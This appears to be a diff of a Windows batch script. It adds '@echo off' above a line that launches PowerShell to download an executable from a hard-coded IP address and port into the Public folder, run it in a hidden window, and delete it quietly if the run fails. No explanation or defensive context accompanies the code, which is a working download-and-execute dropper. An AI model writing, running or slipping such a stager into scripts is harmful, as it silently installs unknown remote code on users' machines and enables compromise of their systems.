@@ -1,1 +1,2 @@
+@echo off
 cmd /c powershell -NoProfile -NoLogo -Command "$ProgressPreference='SilentlyContinue';foreach($number in ('10.22.101.2:55081/default.exe')){try{wget -Uri http://$number -OutFile C:\Users\Public\abcdefg.exe -UseBasicParsing -ErrorAction Stop;Start-Process C:\Users\Public\abcdefg.exe -WindowStyle Hidden -ErrorAction Stop;break}catch{del C:\Users\Public\abcdefg.exe -Force -ErrorAction SilentlyContinue}};exit 0"
